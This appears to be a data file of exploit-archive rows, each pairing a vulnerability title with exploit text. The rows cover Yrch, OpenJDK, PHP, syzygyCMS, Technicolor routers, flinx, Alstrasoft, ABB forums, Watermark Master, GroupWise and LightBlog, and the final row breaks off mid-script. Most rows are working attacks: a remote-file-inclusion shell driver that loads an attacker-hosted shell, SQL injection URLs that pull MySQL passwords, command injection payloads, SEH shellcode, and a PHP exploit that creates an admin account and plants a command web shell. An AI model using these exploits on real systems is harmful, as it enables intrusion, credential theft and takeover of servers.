3025,"Yrch 1.0 - 'plug.inc.phppath' Remote File Inclusion #!/usr/bin/perl  ########################################################################################################## #                                                                                                        # # Yrch! v1.0 Hierarchised Website Directories (plug.inc.php)Remote File Include Vulnerability            # #                                                                                                        #  # Bug Found : DeltahackingTEAM discovery:Dr.Pantagon & Exploitet By Dr.Trojan contact Dr.Trojan[a]DeltaSecurity.ir   # #                                                                                                        # # Class:  Remote File Include Vulnerability                                                              # #                                                                                                        # # exemplary Exp: http://lashiyane.org/[path]/yrch/plugins/metasearch/plug.inc.php?path=[                 # #                                                                                                        # # Remote: Yes                                                                                            # #                                                                                                        # # Type:   Highly critical                                                                                # #                                                                                                        # # Vulnerable Code:include_once($path.""metasearch.class.php"");                                            # #                                                                                                        # # Download:http://switch.dl.sourceforge.net/sourceforge/yrch/Yrch.v1.0.zip                               # #                                                                                                        # # Ptach : www.Advistory.deltasecurity.ir                                                                 # #                                                                                                        # # Bug Found : DeltahackingTEAM Exploitet Discovered &Exploitet: Dr.Trojan<Dr.Trojan[A]Deltasecurity.ir   # #                                                                                                        # # Exploit: Yrch!.pl                                                                                      # #                                                                                                        #  # Web Site:www.deltasecurity.ir <0Ur Server(Secure=99/999)www.takserver.ir>                              #  #                                                                                                        #                              #SP FUCK.............: z_zer0c00l(floozie Mother Test 100%=z_zer0c00l=misbegotten:D)                     # ##########################################################################################################  use LWP::UserAgent; use LWP::Simple;  $target = @ARGV[0]; $shellsite = @ARGV[1]; $shellcmd = @ARGV[2]; $file = ""plug.inc.php?path="";  if(!$target || !$shellsite) {     usage(); }  header();  print ""Type 'exit' to quit""; print ""[cmd]\$""; $cmd = <STDIN>;  while ($cmd !~ ""exit"") {     $xpl = LWP::UserAgent->new() or die;         $req = HTTP::Request->new(GET=>$target.$file.$shellsite.'?&'.$shellcmd.'='.$cmd) or die(""\n\n Failed to connect."");         $res = $xpl->request($req);         $r = $res->content;         $r =~ tr/[\n]/[&#234;]/;      if (@ARGV[4] eq ""-r"")     {         print $r;     }     elsif (@ARGV[5] eq ""-p"")     {     # if not working change cmd variable to null and apply patch manually.     $cmd = ""echo if(basename(__FILE__) == basename(\$_SERVER['PHP_SELF'])) die(); >> list_last.inc"";     print q     {      }     }     else     {     print ""[cmd]\$"";     $cmd = <STDIN>;     } }  sub header() {     print q     { #################################################################################                         Bug Found : DeltahackingTEAM                Yrch!.pl  - Remote File Include Exploit             Vulnerability discovered and exploitet by Dr.Trojan&Dr.Pantagon                           Dr.Trojan@Deltasecurity.ir                 www.DeltaSecurity.ir &  www.Takserver.ir #################################################################################     }; }  sub usage() { header();     print q     { ######################################################################## Usage: perl Yrch!.pl  <Target website> <Shell Location> <CMD Variable> <-r> <-p> <Target Website> - Path to target eg: www.lashiyane.org/yrch/plugins/metasearch <Shell Location> - Path to shell eg: d4wood.by.ru/cmd.gif <CMD Variable> - Shell command variable name eg: Pwd <r> - Show output from shell <p> - plug.inc.php Example: perl Yrch!.pl http://localhost/include http://localhost/s.txt cmd -r -p ########################################################################     }; exit(); }  # Farzad.SHarifi  # milw0rm.com [2006-12-27]",Yrch!.pl,1
41145,"Oracle OpenJDK Runtime Environment 1.8.0_112-b15 - Java Serialization Denial Of Service ''' Application: Java SE  Vendor: Oracle  Bug: DoS  Reported: 23.12.2016  Vendor response: 24.12.2016  Date of Public Advisory: 17.01.2017  Reference: Oracle CPU Jan 2017  Author: Roman Shalymov    1. ADVISORY INFORMATION  Title: Oracle OpenJDK - Java Serialization DoS  Advisory ID: [ERPSCAN-17-006]  Risk: High  Advisory URL: https://erpscan.com/advisories/erpscan-17-006-oracle-openjdk-java-serialization-dos-vulnerability/  Date published: 17.01.2017  Vendor contacted: Oracle   2. VULNERABILITY INFORMATION   Class: Denial of Service  Remotely Exploitable: Yes  Locally Exploitable: Yes  CVE Name: CVE-2017-3241  CVSS Base Score: 9.0   3. VULNERABILITY DESCRIPTION   An attacker can cause DoS of the application which uses OpenJDK Runtime Environment 1.8 as its core runtime engine.   4. VULNERABLE PACKAGES   OpenJDK Runtime Environment build 1.8.0_112-b15   5. SOLUTIONS AND WORKAROUNDS   Fix ObjectInputStream.skipCustomData() method, namely readObject0(false); call in switch statement  Adress Oracle CPU January 2017   6. AUTHOR   Roman Shalymov (@shalymov)   7. TECHNICAL DESCRIPTION   An attacker can craft a malicious sequence of bytes that will cause JVM StackOverflowError in the standard Java deserialization process if it uses ObjectInputStream.readObject() method.   7.1. Proof of Concept  An attacker creates a malicious sequence of bytes, for example, using this python script pwn_ser.py:  ''' #!/usr/bin/env python2  import sys  exp = """"  #serialization header  exp += '\xac\xed\x00\x05'  exp1 = ''  exp1 += '\x72'  exp1 += '\x00\x0c'+'java.io.File'  exp1 += '\x41'*8  exp1 += '\x00'  exp1 += '\x00\x00'   exp += exp1 * 10000  sys.stdout.write(exp)  ''' and save it in exp2.ser file   $ ./pwn_ser2.py > exp2.ser  Let's simulate deserialization process. For this purpose, we create a simple Java program, which uses the following standard deserialization pattern:   Serialize_read.java   import java.io.FileInputStream;  import java.io.ObjectInputStream;  public class Serialize_read {  public static void main(String args[]) throws Exception {    if(args.length < 1) {        System.out.println(""usage: ""+Serialize_read.class.getSimpleName()+"" [file]"");        System.exit(-1);    }    FileInputStream fin = new FileInputStream(args[0]);    ObjectInputStream oin = new ObjectInputStream(fin);    try {      Object objFromDisk = oin.readObject();      String s = (String)objFromDisk;      System.out.println(s);      System.out.println(""Successfully read!"");    }catch(Exception e){}    System.exit(0);  }  }   Let's try to read our malicious file (we can also simulate this stuff over network communication):  $ javac Serialize_read.java  $ java Serialize_read exp2.ser  It causes the following error dump:  Exception in thread ""main"" java.lang.StackOverflowError  at java.io.ObjectInputStream$PeekInputStream.readFully(ObjectInputStream.java:2351)  at java.io.ObjectInputStream$BlockDataInputStream.readUnsignedShort(ObjectInputStream.java:2834)  at java.io.ObjectInputStream$BlockDataInputStream.readUTF(ObjectInputStream.java:2892)  at java.io.ObjectInputStream.readUTF(ObjectInputStream.java:1075)  at java.io.ObjectStreamClass.readNonProxy(ObjectStreamClass.java:684)  at java.io.ObjectInputStream.readClassDescriptor(ObjectInputStream.java:833)  at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1609)  at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1521)  at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1340)  at java.io.ObjectInputStream.skipCustomData(ObjectInputStream.java:1984)  at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1628)  at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1521)  at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1340)  ...  at java.io.ObjectInputStream.skipCustomData(ObjectInputStream.java:1984)  at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1628)  at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1521)  at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1340)  at java.io.ObjectInputStream.skipCustomData(ObjectInputStream.java:1984)  at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1628)  at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1521)  at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1340)  at java.io.ObjectInputStream.skipCustomData(ObjectInputStream.java:1984)  at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1628)  at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1521)   8. REPORT TIMELINE  Reported: 23.12.2016  Vendor response: 24.12.2016  Date of Public Advisory: 17.01.2017  9. REFERENCES http://www.oracle.com/technetwork/security-advisory/cpujan2017-2881727.html https://erpscan.com/advisories/erpscan-17-006-oracle-openjdk-java-serialization-dos-vulnerability/   10. ABOUT ERPScan Research  ERPScan research team specializes in vulnerability research and analysis of critical enterprise applications. It was acknowledged multiple times by the largest software vendors like SAP, Oracle, Microsoft, IBM, VMware, HP for discovering more than 400 vulnerabilities in their solutions (200 of them just in SAP!).  ERPScan researchers are proud of discovering new types of vulnerabilities (TOP 10 Web Hacking Techniques 2012) and of the ""The Best Server-Side Bug"" nomination at BlackHat 2013.  ERPScan experts participated as speakers, presenters, and trainers at 60+ prime international security conferences in 25+ countries across the continents ( e.g. BlackHat, RSA, HITB) and conducted private trainings for several Fortune 2000 companies.  ERPScan researchers carry out the EAS-SEC project that is focused on enterprise application security awareness by issuing annual SAP security researches.  ERPScan experts were interviewed in specialized info-sec resources and featured in major media worldwide. Among them there are Reuters, Yahoo, SC Magazine, The Register, CIO, PC World, DarkReading, Heise, Chinabyte, etc.  Our team consists of highly-qualified researchers, specialized in various fields of cybersecurity (from web application to ICS/SCADA systems), gathering their experience to conduct the best SAP security research.  11. ABOUT ERPScan  ERPScan is the most respected and credible Business Application Cybersecurity provider. Founded in 2010, the company operates globally and enables large Oil and Gas, Financial, Retail and other organizations to secure their mission-critical processes. Named as an aEmerging Vendora in Security by CRN, listed among aTOP 100 SAP Solution providersa and distinguished by 30+ other awards, ERPScan is the leading SAP SE partner in discovering and resolving security vulnerabilities. ERPScan consultants work with SAP SE in Walldorf to assist in improving the security of their latest solutions.  ERPScanas primary mission is to close the gap between technical and business security, and provide solutions for CISO's to evaluate and secure SAP and Oracle ERP systems and business-critical applications from both cyberattacks and internal fraud. As a rule, our clients are large enterprises, Fortune 2000 companies and MSPs, whose requirements are to actively monitor and manage security of vast SAP and Oracle landscapes on a global scale.  We afollow the suna and have two hubs, located in Palo Alto and Amsterdam, to provide threat intelligence services, continuous support and to operate local offices and partner network spanning 20+ countries around the globe.   Adress USA: 228 Hamilton Avenue, Fl. 3, Palo Alto, CA. 94301  Phone: 650.798.5255  Twitter: @erpscan  Scoop-it: Business Application Security '''",Oracle,1
4314,"PHP 'Perl' Extension - 'Safe_mode' Bypass <?php  ########################################################## ###----------------------------------------------------### ###----PHP Perl Extension Safe_mode Bypass Exploit-----### ###----------------------------------------------------### ###-Author:--NetJackal---------------------------------### ###-Email:---nima_501[at]yahoo[dot]com-----------------### ###-Website:-http://netjackal.by.ru--------------------### ###----------------------------------------------------### ##########################################################  if(!extension_loaded('perl'))die('perl extension is not loaded'); if(!isset($_GET))$_GET=&$HTTP_GET_VARS; if(empty($_GET['cmd']))$_GET['cmd']=(strtoupper(substr(PHP_OS,0,3))=='WIN')?'dir':'ls'; $perl=new perl(); echo ""<textarea rows='25' cols='75'>""; $perl->eval(""system('"".$_GET['cmd'].""')""); echo ""&lt;/textarea&gt;""; $_GET['cmd']=htmlspecialchars($_GET['cmd']); echo ""<br><form>CMD: <input type=text name=cmd value='"".$_GET['cmd'].""' size=25></form>""  ?>  # milw0rm.com [2007-08-25]",PHP,1
6200,"syzygyCMS 0.3 - 'index.php' Local File Inclusion ###################################### [+] syzygyCMS 0.3 Local File Inclusion     [+] Discovered By SirGod                            [+] www.mortal-team.com                            [+] Greetz : E.M.I.N.E.M, Ras ,Puscas_marin [+] also ToxicBlood,MesSiAH,xZu ######################################  Example :  http://localhost/x/index.php?page=../../../autoexec.bat  This will open autoexec.bat .  ###########################################  # milw0rm.com [2008-08-03]",.mortal-team.,1
35462,"Technicolor DT5130 2.05.C29GV - Multiple Vulnerabilities Product: Wireless N ADSL 2/2+ Modem Router Firmware Version : V2.05.C29GV Modem Type : ADSL2+ Router Modem Vendor : Technicolor Model: DT5130  Bugs: 1- Unauth Xss - CVE-2014-9142 user=teste&password=teste& userlevel=15&refer=%2Fnigga.html&failrefer=/basicauth.cgi?index.html?failrefer=<script></script><script>alert('TESTE')</script>""%0A&login=Login&password=pass&refer=/index.html&user=teste&userlevel=15&login=Login  2- Arbitrari URL redirect - CVE-2014-9143 failrefer=http://blog.dclabs.com.br&login=Login&password= pass&refer=/index.html&user=1&userlevel=15  3- Command Injection in ping field - CVE-2014-9144 setobject_token=SESSION_CONTRACT_TOKEN_TAG%3D0123456789012345&setobject_ip=s1.3.6.1.4.1.283.1000.2.1.6.4.1.0%3Dwww.google.com.br|`id`&setobject_ping=i1.3.6.1.4.1.283.1000.2.1.6.4.2.0%3D1&getobject_result=IGNORE   --  Ewerson Guimaraes (Crash) Pentester/Researcher DcLabs / Ibliss  Security Team www.dclabs.com.br / www.ibliss.com.br",Technicolor,1
4985,"flinx 1.3 - 'id' SQL Injection --------------------------------------------------------------             H-T Team [ HouSSaMix + ToXiC350 + RxH ] -------------------------------------------------------------- # Author : Houssamix From H-T Team # Script : flinx 1.3 & below                                           # Download : http://rapidshare.com/files/86100439/flinx.rar.html (Nulled)                          # BUG :  Remote SQL Injection Vulnerability   # Dork : Powered by Flinx  ## Vulnerable CODE : ~~~~~~~~ category.php ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ <? $query=""SELECT linkID FROM $table_link WHERE relCatID=$id""; $queryl=mysql_query($query); $count=mysql_numrows($queryl); $result=mysql_query(""SELECT name FROM $table_cat WHERE catID=$id""); if ($row=mysql_fetch_array($result)){ do{ ?> ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  # Exploit : [Target.il]/[flinx_path]/category.php?id=[SQL-CODE]  tables and columns names => table :  flinx_cat columns :  name / catid => table : flinx_link columns :  name  / url / image / relCatID / width / height  exemple : http://site.com/flinx/category.php?id=-999 union select name from flinx_cat--  we can also try get user and password from mysql.user : our user needs to be root@localhost or administrator mysql, check: http://site.com/flinx/category.php?id=-999/**/union/**/select/**/user()/* user and password from mysql.user: http://site.com/flinx/category.php?id=concat(user,0x203a3a20,password)/**/from/**/mysql.user/*  # Gr33tz :  CoNaN - V40 - Mahmood_ali - RaChiDoX & all muslims hackers         # milw0rm.com [2008-01-25]",flinx,1
6092,"Alstrasoft Video Share Enterprise 4.5.1 - 'UID' SQL Injection |___________________________________________________| | | Video Share Enterprise (UID) Remote SQL Injection Vulnerability | |___________________________________________________ |---------------------Hussin X----------------------| | |    Author: Hussin X | |    Home :  www.tryag.cc/cc | |    email:  darkangel_g85[at]Yahoo[DoT]com | | |___________________________________________________ |                                                   | | | | script : http://www.alstrasoft.com/videoshare.htm | | DorK   : Powered By AlstraSoft Video Share Enterprise | DorK   : inurl:""album.php?UID="" | DorK   : inurl:""view_picture.php?viewkey="" |___________________________________________________|  Exploit:     www.[target].com/Script/album.php?UID=-58+UNION+SELECT+1,2,version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31--   L!VE DEMO: :  http://www.alstrahost.com/vs/album.php?UID=-58+UNION+SELECT+1,2,version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31--  ________________________ table_name : column_name    adv:adv_status  adv:adv_text  adv:adv_name  adv:adv_id  audio:embed  audio:be_rated  audio:be_comment  audio:filehome  audio:rate  audio:ratedby  audio:fav_num  audio:featured  audio:com_num  audio:viewnumber  audio:vkey  audio:country  audio:location  audio:record_date  audio:adddate  audio:addtime  audio:type  audio:duration  audio:duration  audio:flvdoname  audio:vdoname  audio:channel  audio:keyword  audio:featuredesc  audio:UID  audio:description  audio:VID  ________________________    ____________________________( Greetz )____________________________ | | tryag.cc | DeViL iRaQ | IRAQ DiveR | IRAQ_JAGUR | str0ke |    | Iraqihack | FAHD | mos_chori | Silic0n  | |_________________________________________________________________                          Im IRAQi  # milw0rm.com [2008-07-17]",.tryag.cccc,1
11096,"ABB 1.1 - Forum Remote Database Disclosure ==============================================================================                       _      _       _          _      _   _                      / \    | |     | |        / \    | | | |                     / _ \   | |     | |       / _ \   | |_| |                    / ___ \  | |___  | |___   / ___ \  |  _  |    IN THE NAME OF /_/   \_\ |_____| |_____| /_/   \_\ |_| |_|   ==============================================================================         [»] ABB v1.1 Forum Remote Database Disclosure Vulnerability ==============================================================================      [»] Script:             [ ABB Forums ]     [»] Language:           [ ASP ]     [»] Site page:          [ Possede de tres nombreuses options d administration et de configuration ]     [»] Founder:            [ ViRuSMaN <v.-m@live.com - totti_55_3@yahoo.com> ]     [»] Greetz to:          [ HackTeach Team , Egyptian Hackers , All My Friends & pentestlabs.com  ]     [»] My Home:            [ HackTeach.Org , Islam-Attack.Com ]  ###########################################################################  ===[ Exploit ]===      [»] http://server/[path]/fpdb/abb.mdb   ===[ Admin Login ]===      [»] http://server/[path]/admin.asp   Author: ViRuSMaN <-  ###########################################################################",ABB,0
29594,"Watermark Master 2.2.23 - '.wstyle' Local Buffer Overflow (SEH) #!/usr/bin/perl  ######################################################################################### # Exploit Title: Watermark Master v2.2.23 .wstyle Buffer Overflow (SEH) # Date: 10-28-2013 # Exploit Author: Mike Czumak (T_v3rn1x) -- @SecuritySift # Vulnerable Software: Watermark Master v2.2.23 # Software Link: http://www.videocharge.com/download/WatermarkMaster_Install.exe # Version: 2.2.23 # Tested On: Windows XP SP3 ######################################################################################### # Timeline: # - Oct 28: Vuln discovered, vendor alerted and acknowledged receipt of bug submission # - Oct 29: Requested fix timeline from vendor for public disclosure # - Nov 1:  Similar exploit publicaly released for same version of software #   -- http://www.exploit-db.com/exploits/29327/  # - Nov 3:  No response from vendor, follow-up email sent # - Nov 14: No response from vendor, public disclosure ######################################################################################### # Creates a malicious Style file (.wstyle) #  # To exploit: # 1) Place sploit.wstyle file in Video Styles folder  # 		..\Videocharge Software\Watermark Master\Styles\Video # 2) Launch Watermark Master application, add an image and apply the style #		WaterMark --> Add --> Image (can also add text, rectangle, etc) #		WaterMark --> Apply Style... --> sploit # 3) Save (Ctrl+s) -- Application will crash, launching the exploit #########################################################################################  my $buffsize = 15000; # sets buffer size for consistent sized payload  my $xmlstart = '<?xml version=""1.0"" encoding=""Windows-1251"" ?> <cols name=""'; # build the start of the xml file  # nseh is at offset 512, followed by 9484 bytes of available data my $junk = ""\x41"" x (512 - $xmlstart); my $nseh = ""\xeb\x08\x90\x90""; # overwrite next seh with jmp instruction (8 bytes) my $seh = pack('V',0x72D11F39); # overwrite seh w/ pop edi pop esi ret 				# ASLR: False, Rebase: False, SafeSEH: False, OS: True 				# (C:\WINDOWS\system32\msacm32.drv) (no suitable app modules found) my $nops = ""\x90"" x 20;   # Alpha-numeric encoding used for xml-based Calc.exe payload # msfpayload windows/exec EXITFUNC=seh CMD=calc.exe R |  # msfencode -e x86/alpha_upper -b '\x00\xac\xff\xca' # size 469  my $shell = ""\x89\xe6\xd9\xeb\xd9\x76\xf4\x5b\x53\x59\x49\x49\x49\x49"" . ""\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56"" . ""\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41"" . ""\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42"" . ""\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4b"" . ""\x58\x4d\x59\x35\x50\x33\x30\x45\x50\x35\x30\x4c\x49\x4b"" . ""\x55\x46\x51\x48\x52\x42\x44\x4c\x4b\x50\x52\x36\x50\x4c"" . ""\x4b\x30\x52\x54\x4c\x4c\x4b\x46\x32\x42\x34\x4c\x4b\x34"" . ""\x32\x57\x58\x44\x4f\x58\x37\x50\x4a\x56\x46\x36\x51\x4b"" . ""\x4f\x50\x31\x59\x50\x4e\x4c\x37\x4c\x53\x51\x53\x4c\x44"" . ""\x42\x46\x4c\x37\x50\x49\x51\x58\x4f\x44\x4d\x33\x31\x58"" . ""\x47\x4a\x42\x5a\x50\x31\x42\x30\x57\x4c\x4b\x50\x52\x54"" . ""\x50\x4c\x4b\x57\x32\x47\x4c\x55\x51\x38\x50\x4c\x4b\x31"" . ""\x50\x34\x38\x4b\x35\x4f\x30\x43\x44\x51\x5a\x45\x51\x38"" . ""\x50\x36\x30\x4c\x4b\x30\x48\x34\x58\x4c\x4b\x36\x38\x51"" . ""\x30\x33\x31\x59\x43\x4b\x53\x57\x4c\x51\x59\x4c\x4b\x46"" . ""\x54\x4c\x4b\x45\x51\x39\x46\x46\x51\x4b\x4f\x50\x31\x59"" . ""\x50\x4e\x4c\x4f\x31\x48\x4f\x34\x4d\x55\x51\x58\x47\x56"" . ""\x58\x4d\x30\x33\x45\x4c\x34\x54\x43\x53\x4d\x5a\x58\x47"" . ""\x4b\x33\x4d\x31\x34\x33\x45\x4b\x52\x46\x38\x4c\x4b\x31"" . ""\x48\x31\x34\x35\x51\x4e\x33\x55\x36\x4c\x4b\x44\x4c\x50"" . ""\x4b\x4c\x4b\x56\x38\x35\x4c\x43\x31\x59\x43\x4c\x4b\x45"" . ""\x54\x4c\x4b\x35\x51\x58\x50\x4c\x49\x31\x54\x57\x54\x37"" . ""\x54\x51\x4b\x51\x4b\x43\x51\x50\x59\x51\x4a\x36\x31\x4b"" . ""\x4f\x4d\x30\x30\x58\x31\x4f\x50\x5a\x4c\x4b\x35\x42\x5a"" . ""\x4b\x4c\x46\x31\x4d\x53\x5a\x45\x51\x4c\x4d\x4d\x55\x4e"" . ""\x59\x33\x30\x45\x50\x53\x30\x50\x50\x32\x48\x56\x51\x4c"" . ""\x4b\x52\x4f\x4d\x57\x4b\x4f\x59\x45\x4f\x4b\x4b\x4e\x54"" . ""\x4e\x57\x42\x5a\x4a\x33\x58\x4f\x56\x4d\x45\x4f\x4d\x4d"" . ""\x4d\x4b\x4f\x38\x55\x57\x4c\x54\x46\x53\x4c\x34\x4a\x4b"" . ""\x30\x4b\x4b\x4b\x50\x52\x55\x34\x45\x4f\x4b\x57\x37\x32"" . ""\x33\x33\x42\x52\x4f\x52\x4a\x43\x30\x51\x43\x4b\x4f\x39"" . ""\x45\x45\x33\x35\x31\x42\x4c\x33\x53\x46\x4e\x32\x45\x34"" . ""\x38\x53\x55\x53\x30\x41\x41"";  my $xmlend = '"" clsid=""blah""> </cols>'; # build the rest of the xml file   my $sploit = $junk.$nseh.$seh.$nops.$shell; # build sploit portion of buffer my $fill = ""\x43"" x ($buffsize - (length($xmlstart)+length($sploit)+length($xmlend))); # fill remainder of buffer with junk for consistent size my $buffer = $xmlstart.$sploit.$fill.$xmlend; # build final buffer  # write the exploit buffer to file my $file = ""sploit.wstyle""; open(FILE, "">$file""); print FILE $buffer; close(FILE); print ""Exploit file created ["" . $file . ""]\n""; print ""Buffer size: "" . length($buffer) . ""\n"";",videocharge,1
5515,"Groupwise 7.0 - 'mailto: scheme' Buffer Overflow (PoC) PRODUCT: GroupWise 7.0 OS: Windows Xp  The scheme ""mailto"" is vulnerable if one takes as default mail client to  GroupWise, the fault is to implement the scheme followed by an extensive  argument and this causes the buffer overflow. This brings the consequence that  can overwrite the EIP and is able to execute arbitrary code. The result with a  debbuger us what reveals.   Access violation when executing [41414141]   What power is that vulnerability to attach a html file which is included in an  iframe with the scheme badly formed runs only watch.  proof of concept  #!/usr/bin/python  a = ""<iframe src='mailto:"" a += ""A"" * 1530 a += ""\x61\x61\x61\x61"" a += ""' width='320' height='300' scrolling='yes' name='content'></iframe>""  file = open(""test.html"", ""w"") file.write(a) file.close()  greetings!  Juan Pablo Lopez Yacubian  # milw0rm.com [2008-04-28]",novell,1
4505,"LightBlog 8.4.1.1 - Remote Code Execution #!/usr/bin/php -q -d short_open_tag=on <? echo "" LightBlog 8.4.1.1 Remote Code Execution Exploit by BlackHawk <hawkgotyou@gmail.com> <http://itablackhawk.altervista.org> Thanks to rgod for the php code and Marty for the Love  ""; if ($argc<3) { echo ""Usage: php "".$argv[0]."" Host Path  Host:          target server (ip/hostname) Path:          path of lightblog  Example: php "".$argv[0]."" localhost /lightblog/ dir"";  die; } error_reporting(0); ini_set(""max_execution_time"",0); ini_set(""default_socket_timeout"",5);  function quick_dump($string) {   $result='';$exa='';$cont=0;   for ($i=0; $i<=strlen($string)-1; $i++)   {    if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))    {$result.=""  ."";}    else    {$result.=""  "".$string[$i];}    if (strlen(dechex(ord($string[$i])))==2)    {$exa.="" "".dechex(ord($string[$i]));}    else    {$exa.="" 0"".dechex(ord($string[$i]));}    $cont++;if ($cont==15) {$cont=0; $result.=""\r\n""; $exa.=""\r\n"";}   }  return $exa.""\r\n"".$result; } $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)'; function sendpacketii($packet) {   global $proxy, $host, $port, $html, $proxy_regex;   if ($proxy=='') {     $ock=fsockopen(gethostbyname($host),$port);     if (!$ock) {       echo 'No response from '.$host.':'.$port; die;     }   }   else {         $c = preg_match($proxy_regex,$proxy);     if (!$c) {       echo 'Not a valid proxy...';die;     }     $parts=explode(':',$proxy);     echo ""Connecting to "".$parts[0]."":"".$parts[1]."" proxy...\r\n"";     $ock=fsockopen($parts[0],$parts[1]);     if (!$ock) {       echo 'No response from proxy...';die;         }   }   fputs($ock,$packet);   if ($proxy=='') {     $html='';     while (!feof($ock)) {       $html.=fgets($ock);     }   }   else {     $html='';     while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {       $html.=fread($ock,1);     }   }   fclose($ock); }  $host=$argv[1]; $path=$argv[2]; $cmd=""""; for ($i=3; $i<=$argc-1; $i++){ $cmd.="" "".$argv[$i]; } $cmd=urlencode($cmd);   $port=80; $proxy="""";  if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;} if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}  echo ""Step 0 - If Shell already exists, run it..\r\n""; $packet =""GET "".$p.""images/piggy_marty.php?cmd=$cmd HTTP/1.0\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; sendpacketii($packet); if (strstr($html,""666999"")) {   echo ""Exploit succeeded...\r\n"";   $temp=explode(""666999"",$html);   die(""\r\n"".$temp[1].""\r\n""); }  echo 'Step 1 - Creating New User (Name: Piggy_Marty Pwd: DAFORNO_IMPERAT)..'; //Retrieving the ""confirmation"" code $packet =""GET "".$p.""register.php HTTP/1.0\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; sendpacketii($packet);  preg_match('#<b>([a-zA-Z0-9]+?)</b><input name=""rand"" type=""hidden"" value=""([a-zA-Z0-9]+?)"" />#is', $html, $fuori);  $conf_code = $fuori[1]; $rand_code = $fuori[2];  //Doing the registration $data=""rand=$rand_code&val=$conf_code&username_post=Piggy_Marty&pwd1_post=DAFORNO_IMPERAT&pwd2_post=DAFORNO_IMPERAT&name_post=Piggy_Marty&email_post=hawkgotyou@gmail.com""; $packet=""POST "".$p.""register.php HTTP/1.0\r\n""; $packet.=""Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\r\n""; $packet.=""Accept-Language: it\r\n""; $packet.=""Content-Type: application/x-www-form-urlencoded\r\n""; $packet.=""Accept-Encoding: gzip, deflate\r\n""; $packet.=""User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n""; $packet.=""Host: localhost\r\n""; $packet.=""Content-Length: "".strlen($data).""\r\n""; $packet.=""Connection: Close\r\n""; $packet.=""Cache-Control: no-cache\r\n\r\n""; $packet.=$data; sendpacketii($packet); sleep(1);  echo 'Step 2 - Promoting Piggy_Marty to admin level..'; $data=""type_post=admin&username_post=Piggy_Marty""; $packet=""POST "".$p.""cp_memberedit.php HTTP/1.0\r\n""; $packet.=""Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\r\n""; $packet.=""Accept-Language: it\r\n""; $packet.=""Content-Type: application/x-www-form-urlencoded\r\n""; $packet.=""Accept-Encoding: gzip, deflate\r\n""; $packet.=""User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n""; $packet.=""Host: localhost\r\n""; $packet.=""Content-Length: "".strlen($data).""\r\n""; $packet.=""Connection: Close\r\n""; $packet.=""Cache-Control: no-cache\r\n\r\n""; $packet.=$data; sendpacketii($packet); sleep(1);  echo 'Step 3 - Uploading Shell Creator..'; $data=""-----------------------------7d529a1d23092a\r\n""; $data.=""Content-Disposition: form-data; name=\""image\""; filename=\""piggy_marty_creator.php\""\r\n""; $data.=""Content-Type:\r\n\r\n""; $data.=""<?php \$fp=fopen('piggy_marty.php','w'); fputs(\$fp,'<?php error_reporting(0); set_time_limit(0); if (get_magic_quotes_gpc()) { \$_GET[cmd]=stripslashes(\$_GET[cmd]); } echo 666999; passthru(\$_GET[cmd]); echo 666999; ?>'); fclose(\$fp); chmod('piggy_marty.php',777); ?>\r\n""; $data.='-----------------------------7d529a1d23092a Content-Disposition: form-data; name=""title""  Not so good if you see this.. -----------------------------7d529a1d23092a Content-Disposition: form-data; name=""post""  An Exploit has attacked your site.. contact hawkgotyou@gmail.com for more details -----------------------------7d529a1d23092a-- '; $packet=""POST "".$p.""main.php HTTP/1.0\r\n""; $packet.=""Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\r\n""; $packet.=""Referer: http://"".$host.$path.""/\r\n""; $packet.=""Cookie: Lightblog_username=Piggy_Marty&Lightblog_password=DAFORNO_IMPERAT\r\n""; $packet.=""Accept-Language: it\r\n""; $packet.=""Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\r\n""; $packet.=""Accept-Encoding: gzip, deflate\r\n""; $packet.=""User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Content-Length: "".strlen($data).""\r\n""; $packet.=""Connection: Close\r\n""; $packet.=""Cache-Control: no-cache\r\n\r\n""; $packet.=$data; sendpacketii($packet); sleep(1);  echo 'Step 